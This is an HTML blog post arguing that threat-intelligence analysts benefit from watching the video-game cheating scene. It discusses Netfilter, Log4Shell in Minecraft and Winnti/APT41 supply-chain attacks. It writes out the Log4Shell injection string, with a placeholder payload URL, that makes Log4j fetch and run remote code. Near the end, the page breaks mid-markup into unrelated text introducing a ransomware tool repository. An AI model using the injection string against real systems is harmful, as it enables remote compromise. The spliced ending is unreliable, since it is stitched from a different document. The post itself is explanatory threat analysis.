<div class='post-body entry-content float-container' id='post-body-5490646868331927084'>
<p></p><div class="separator" style="clear: both; text-align: center;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhxh9TpHQWM1YwTkrEsa2bkTOB2JcYYa3kw66Efu1JYXx-2f37Fp-XZG9va1Km-bIoyAHiSXfIg7KBLnRknVIxMmBvqMzlvICIPyDMwmUBU_PT2NhLKjZ_Fh_Ker8HjindT7-rudiXV_-Eumj2WDGIRG4zWOl79Akv_vqKxje3XGm5__gINTFQy04G0oQ/s1244/GamerCheaterHackerSpy2.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="723" data-original-width="1244" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhxh9TpHQWM1YwTkrEsa2bkTOB2JcYYa3kw66Efu1JYXx-2f37Fp-XZG9va1Km-bIoyAHiSXfIg7KBLnRknVIxMmBvqMzlvICIPyDMwmUBU_PT2NhLKjZ_Fh_Ker8HjindT7-rudiXV_-Eumj2WDGIRG4zWOl79Akv_vqKxje3XGm5__gINTFQy04G0oQ/s16000/GamerCheaterHackerSpy2.png" /></a></div><p></p><p><span style="font-family: Roboto;">The title of this blog is a homage to the film Tinker Tailor Soldier Spy and presents the fact that video games and cheating is also tied to hacking and spying. It is a common trope in cybersecurity that professionals first became interested in the field through an encounter while playing games.&nbsp;</span><span style="font-family: Roboto;">Speaking personally, I first became enthralled&nbsp;with hacking in 2008 by matching against some modders using hacked weapons while playing&nbsp;</span><a href="https://en.wikipedia.org/wiki/Halo_3" style="font-family: Roboto;" target="_blank">Halo 3</a>&nbsp;<span style="font-family: Roboto;">(my favourite game of all time).</span></p><p><span style="font-family: Roboto;">This blog aims to highlight why monitoring the video game industry is important for cyber threat intelligence analysts hunting down the latest threats. Video games and hacking are very intertwined. Many hackers start out by creating cheats for games, and have to play the games to begin with to learn how to hack them.&nbsp;</span></p><p><span style="font-family: Roboto;">There are also several notable incidents whereby hacking in video games escalated to become critical issues for the software development industry and enterprise security realms. This includes zero-day exploits, stolen code-signing certificates, rootkit development, and supply-chain attacks, as well as ransomware and intellectual property theft.</span></p><p><span style="font-family: Roboto; font-size: large;"><b>The Video Game Cheating Industry</b></span></p><p><span style="font-family: Roboto;">Cheating in video games is as old as the industry itself. However, nowadays cheating is a massive multi-billion dollar underground economy. What was once only done by a small group of hackers has evolved into massive criminal enterprises, selling Cheats-as-a-Service.&nbsp;</span></p><p><span style="font-family: Roboto;">In March 2021, the BBC reported that Chinese police worked with Tencent to <a href="https://www.bbc.co.uk/news/technology-56579449" target="_blank">disrupt</a> one of the largest video-game-cheating operations ever. The perpetrators designed and sold cheats for popular games, such as Overwatch and Call of Duty. Approximately</span><span style="font-family: Roboto;">&nbsp;$76m (&#163;55m) in revenue was made by the criminal business, which charged a subscription fee to clients.&nbsp;</span><span style="font-family: Roboto;">Subscription prices for users began at around $10 a day, and up to $200 a month.</span></p><p><span style="font-family: Roboto;">In June 2021, security researcher Karsten Hahn uncovered a <a href="https://twitter.com/struppigel/status/1405483373280235520" target="_blank">new rootkit</a> signed by Microsoft. Later, Microsoft published a blog&nbsp;investigating a threat actor distributing a malicious signed driver, dubbed the <a href="https://msrc-blog.microsoft.com/2021/06/25/investigating-and-mitigating-malicious-drivers/" target="_blank">Netfilter rootkit</a>, within gaming environments. The operation was able to trick Microsoft into signing their code by&nbsp;</span><span style="font-family: Roboto;">submitting drivers for certification through the Windows Hardware Compatibility Program. The implications here were massive, however, t</span><span style="font-family: Roboto;">he malicious actor&#8217;s activity was limited to the gaming sector specifically in China. Microsoft also said they believed the aim of the driver was to&nbsp;gain an advantage in games and possibly exploit other players by compromising their accounts through common tools like keyloggers.&nbsp;</span></p><p><span style="font-family: Roboto;">The type of malicious software (malware) like the Netfilter rootkit is common in the gaming industry as to be able to defeat anti-cheat systems you often have to be running at a level lower than the Windows operating system (OS), at the kernel-mode level.</span></p><p><b style="font-family: Roboto; font-size: x-large;">Hackers in Games</b></p><p><span style="font-family: Roboto;">One of the most critical events in recent gaming history was <a href="https://en.wikipedia.org/wiki/Log4Shell" target="_blank">Log4Shell</a>, a vulnerability&nbsp;</span><span style="font-family: Roboto;">also known as CVE-2021-44228</span><span style="font-family: Roboto;">&nbsp;with a CVSS score of 10.0. That was first uncovered by the Alibaba Security team and disclosed on 9 December 2021 and was exploited immediately afterwards by a range of threats, including botnets, ransomware, and advanced persistent threat (APT) groups - but it all started in Minecraft. At the time of this writing, even five months since it was initially disclosed, thousands of applications <a href="https://threatpost.com/java-apps-vulnerable-log4shell/179397/" target="_blank">remain vulnerable</a> to Log4Shell.</span></p><p><span style="font-family: Roboto;">Log4Shell was a zero-day exploit in the ubiquitous&nbsp;Apache Log4j logging library that if exploited successfully could lead to remote code execution (RCE) on the targeted device. Log4Shell is also trivial to exploit. It can be done so by pasting "${jndi:ldap://&lt;URL to payload&gt;}" into an input field and waiting for Log4j to fetch the remote payload and execute it, opening a backdoor on the affected system.</span></p><p><span style="font-family: Roboto;">Using Log4Shell, hackers quickly <a href="https://www.polygon.com/22832081/minecraft-java-microsoft-security-risk" target="_blank">began exploiting</a>&nbsp;the popular video game, Minecraft. When a user pasted the string into a message they could compromise the entire Minecraft server and other players' systems. This soon <a href="https://www.youtube.com/watch?v=Z22O5uEsF6U" target="_blank">became known</a> as the "worst week in Minecraft history".&nbsp;</span><span style="font-family: Roboto;">As soon as players began to see this message pop up on their screens panic ensued.&nbsp;</span></p><p><span style="font-family: Roboto;">As they began to realize the cause of this was the Log4Shell exploit others joined in and began to leverage it malicious attacks in Minecraft, and in other games such as&nbsp;<a href="https://www.theverge.com/2022/1/22/22896785/dark-souls-3-remote-execution-exploit-rce-exploit-online-hack" target="_blank">Dark Souls 3</a>. This included exploiting Log4Shell to compromise other players' accounts and stealing or destroying their in-game items, which can take months or years to acquire and can be worth hundreds or thousands of real dollars.</span></p><p><span style="font-family: Roboto;"></span></p><div class="separator" style="clear: both; text-align: center;"><span style="font-family: Roboto;"><a href="https://blogger.googleusercontent.com/img/a/AVvXsEhP3MMQ0swhsB1239RQv0T7BXa9NyFbE7LbrP7EkvMs0pxe0wOob3AJfb-q3tO2SGwvz7ySuNBlOivplgtP78WyAbzqcDoQO_eXn0u_bwosK-c2H1VOvLQNFSEMcC8XUtoUuTbx2J7cdH9xb-f5NpBjaz_PPcdYnWQ8cagtdETSnpr-02G36ObtrNFf1g" style="margin-left: 1em; margin-right: 1em;"><img alt="" data-original-height="372" data-original-width="509" height="293" src="https://blogger.googleusercontent.com/img/a/AVvXsEhP3MMQ0swhsB1239RQv0T7BXa9NyFbE7LbrP7EkvMs0pxe0wOob3AJfb-q3tO2SGwvz7ySuNBlOivplgtP78WyAbzqcDoQO_eXn0u_bwosK-c2H1VOvLQNFSEMcC8XUtoUuTbx2J7cdH9xb-f5NpBjaz_PPcdYnWQ8cagtdETSnpr-02G36ObtrNFf1g=w400-h293" width="400" /></a></span></div><div class="separator" style="clear: both; text-align: center;"><span style="font-family: Roboto;"><i>Figure 1. Log4Shell exploited in Minecraft</i></span></div><p><span style="font-family: Roboto;"><span style="font-size: large;"><b>Historical Cybersecurity Incidents In The Gaming industry</b></span></span></p><p><span style="font-family: Roboto;">Video game developers and publishers receive many of the same threats that organizations such as banks or governments may receive. The Winnti threat group's other cryptonyms include </span><a href="https://www.mandiant.com/search?search=APT41" style="font-family: Roboto;" target="_blank">APT41</a><span style="font-family: Roboto;">, </span><a href="https://www.microsoft.com/security/blog/2017/01/25/detecting-threat-actors-in-recent-german-industrial-attacks-with-windows-defender-atp/" style="font-family: Roboto;" target="_blank">BARIUM</a><span style="font-family: Roboto;">, </span><a href="https://adversary.crowdstrike.com/en-US/adversary/wicked-panda/" style="font-family: Roboto;" target="_blank">WickedPanda</a><span style="font-family: Roboto;">, and </span><a href="https://www.crowdstrike.com/blog/meet-crowdstrikes-adversary-of-the-month-for-july-wicked-spider/" style="font-family: Roboto;" target="_blank">WickedSpider</a><span style="font-family: Roboto;">. The gaming industry is not Winnti's only target, however, as the group has infiltrated&nbsp;over 100 victim companies in the US and abroad, including software development companies, computer hardware manufacturers, telecommunications providers, social media companies, non-profit organizations, universities, think tanks, and foreign governments, as well as pro-democracy politicians and activists in Hong Kong. Five members of APT41 were&nbsp;<a href="https://www.justice.gov/opa/pr/seven-international-cyber-defendants-including-apt41-actors-charged-connection-computer" target="_blank">indicted</a>&nbsp;by the US Department of Justice in September 2020 with an additional two members arrested in Malaysia. US p</span><span style="font-family: Roboto;">rosecutors accused the two of working on behalf of the Chinese government&#8217;s intelligence agency, the Guangdong State Security Department (GSSD) of the Ministry of State Security (MSS).</span></p><p><span style="font-family: Roboto;">In April 2013, Kaspersky disclosed a <a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/20134508/winnti-more-than-just-a-game-130410.pdf" target="_blank">report</a> called&nbsp;&#8220;Winnti -&nbsp;</span><span style="font-family: Roboto;">More than just a game". The researchers reported that in Q3 2011, the Winnti group's malware was detected on a large number of computers that were linked together through the mutual use by players of a popular online game. It was later revealed that the malware landed on the players' systems as part of a regular update from the game's official update server. Making it one of the first of several software supply-chain attacks orchestrated by this threat group. APT41 would go on to orchestrate the infamous <a href="https://blog.talosintelligence.com/2017/09/avast-distributes-malware.html" target="_blank">CCleaner supply-chain attack</a>&nbsp;years later in September 2017.</span></p><p><span style="font-family: Roboto;">Kaspersky researchers uncovered that the digital signature used to sign the original Winnti malware was stolen from </span><span style="font-family: Roboto;">another video game vendor known as KOG,&nbsp;</span><span style="font-family: Roboto;">based in South Korea. The researchers then found that between 2011 and 2013, the Winnti group had used at least 18 stolen code-signing certificates in its campaigns all belonging to video games companies from South Korea, Japan, the Philippines, China, and the US.</span></p><p></p><div class="separator" style="clear: both; text-align: center;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhXz2tYr1eCITD7lTaO6L30lnd5NdV5XVyYs1GGr4QXsTauMNCFXIaWvLS6MG5bUqiRPQ1xm9uew0U2jKwNwbboUJ3M4ApkGwdl79pVtCPQ2LNgYyI91HPDxa8PPl6YHU7H2oYuu-MOpxQPQ9mfJI-c839JW_ANMVvBh5HAOkjGcY0FH4_q-ga2BQB-0Q/s800/apt41.jpeg" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="448" data-original-width="800" height="358" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhXz2tYr1eCITD7lTaO6L30lnd5NdV5XVyYs1GGr4QXsTauMNCFXIaWvLS6MG5bUqiRPQ1xm9uew0U2jKwNwbboUJ3M4ApkGwdl79pVtCPQ2LNgYyI91HPDxa8PPl6YHU7H2oYuu-MOpxQPQ9mfJI-c839JW_ANMVvBh5HAOkjGcY0FH4_q-ga2BQB-0Q/w640-h358/apt41.jpeg" width="640" /></a></div><span style="font-family: Roboto;"><div style="text-align: center;"><i>Figure 6. APT41 indicted by the Department of Justice in September 2020</i></div></span><p></p><p><span style="font-family: Roboto;">Hacking video games companies by a sophisticated state-sponsored adversary seemed unusual. This was due to the fact that during the same timeframe Chinese APTs had targeted Google, Adobe, and the New York Times. Many security experts were curious why Chinese intelligence agencies were heavily investing resources into hacking games companies.&nbsp;</span></p><p><span style="font-family: Roboto;"><b>Potential Winnti objectives for targeting the gaming industry:</b></span></p><p></p><ul style="text-align: left;"><li><span style="font-family: Roboto;"><b>Objective 1</b> - Online games could be exploited to accumulate in-game currency, which could be resold for real currency</span></li><li><span style="font-family: Roboto;"><b>Objective 2</b> - Source code theft could be used to find exploits in the software to support Objective 1&nbsp;</span></li><li><span style="font-family: Roboto;"><b>Objective 3</b> - Having zero-day exploits in any software is advantageous for an intelligence agency as it grants the ability to target other organizations and individuals</span></li><li><span style="font-family: Roboto;"><b>Objective 4</b> - Stealing personal customer data</span></li><li><span style="font-family: Roboto;"><b>Objective 5</b> - Stealing software inventions and innovations to support other industries, such as military combat simulators</span></li><li><span style="font-family: Roboto;"><b>Objective 6</b> - Stealing&nbsp;intellectual property to reproduce in their own domestic gaming industry</span></li><li><span style="font-family: Roboto;"><b>Objective 7</b> - Repurposing resources like code-signing certificates and email accounts for other cyber-espionage campaigns</span></li></ul><div><span style="font-family: Roboto;">Additionally, in March 2019 and April 2020, security researchers from <a href="https://www.welivesecurity.com/2019/03/11/gaming-industry-scope-attackers-asia/" target="_blank">ESET</a> and <a href="https://quointelligence.eu/2020/04/winnti-group-insights-from-the-past/" target="_blank">QuoIntelligence</a>, respectively, disclosed further campaigns linked to the Winnti group against the video games industry. Indicating&nbsp;that these adversaries continue to spy on games companies, primarily in Asia, up to 10 years later since the campaign began.</span></div><div><span style="font-family: Roboto;"><br /></span></div><div><span style="font-family: Roboto;">In March 2021, ESET also disclosed <a href="https://www.welivesecurity.com/2021/02/01/operation-nightscout-supply-chain-attack-online-gaming-asia/" target="_blank">another campaign</a> reminiscent of previous Winnti attacks but did not formally attribute it to the APT group. The researchers uncovered a software supply-chain attack against emulation software, NoxPlayer, to install surveillance malware on the computers of online gamers. The maker of NoxPlayer, BigNox, says the software has 150 million users in 150 countries. The infrastructure of BigNox, was reportedly compromised by an adversary to push a malicious update. And, in some cases, additional payloads were downloaded by the BigNox updater from attacker-controlled servers.</span></div><div><span style="font-family: Roboto;"><br /></span></div><div><div><span style="font-family: Roboto; font-size: large;"><b>So What?</b></span></div><div><span style="font-family: Roboto;"><br /></span></div><div><span style="font-family: Roboto;">Hopefully this blog highlights the fact that it is particularly important to monitor the cyber threat landscape of the gaming industry. There have been several occasions where a cyber incident began in the gaming sector and eventually worked its way to the software industry, and thus all other sectors are affected by it. The Log4Shell event, several software supply-chain attacks, digital certificate theft campaigns, and intellectual property theft campaigns, among others. Although these incidents may have started in the gaming industry it eventually affected top companies, such as Microsoft.&nbsp;</span></div></div><div><span style="font-family: Roboto;"><br /></span></div><div><span style="font-family: Roboto;">In my experience, hackers have often started out by hacking their favourite game. They either reverse engineer it themselves, learn from others, or encounter other hackers online. This then leads to cheating and/or selling cheats and techniques, and potentially zero-day exploit development. Although some of these larger cheating shops may possess the ability to discover a zero-day vulnerability or develop a Proof-of-Concept (PoC) exploit to support their cheats, there are much larger ramifications affecting the entire enterprise IT ecosystem.</span></div><div><span style="font-family: Roboto;"><br /></span></div><div><span style="font-family: Roboto;"><b>Key reasons to monitor the gaming industry cyber threat landscape:</b></span></div><div><ul style="text-align: left;"><li><span style="font-family: Roboto;">From a Cyber Threat Intelligence (CTI) perspective, it can be useful to monitor hacking activities in the gaming communities as it can sometimes lead to corporate enterprise security&nbsp;</span></li><li><span style="font-family: Roboto;">Also from a CTI perspective, the tactics, techniques, and procedures (TTPs) that affect video game companies will affect the software industry, and thus all other sectors</span></li><li><span style="font-family: Roboto;">From a detection engineering perspective, monitoring the cheating industry for the latest rootkit developments and bypassing anti-cheat systems is important to identify the latest techniques leveraged in the wild for bypassing defences</span></li><li><span style="font-family: Roboto;">From a software development perspective, it would also be useful to monitor the development of bypasses for copyright protection and anti-piracy protections of games</span></li></ul><div><span style="font-family: Roboto; font-size: medium;"><b>Additional Resources</b></span></div></div><div><ul style="text-align: Introduction Ransomware attacks are becoming increasingly damaging, but one thing remains consistent: the tools these cybercriminals rely on. The Ransomware Tool Matrix is a comprehensive resource that sheds light on the tactics, techniques, and procedures (TTPs) commonly used by ransomware and extortionist gangs. This repository provides defenders with actionable intelligence on the tools frequently leveraged by adversaries, thanks to the insights shared publicly by the US Cybersecurity and Infrastructure Security Agency (CISA)&#39;s #StopRansomware advisories and The DFIR Report&#39;s publications, among others. This repository offers straightforward insights from compiled open source intelligence (OSINT) research that can be directly applied to threat hunting, detection engineering, and incident response operations.
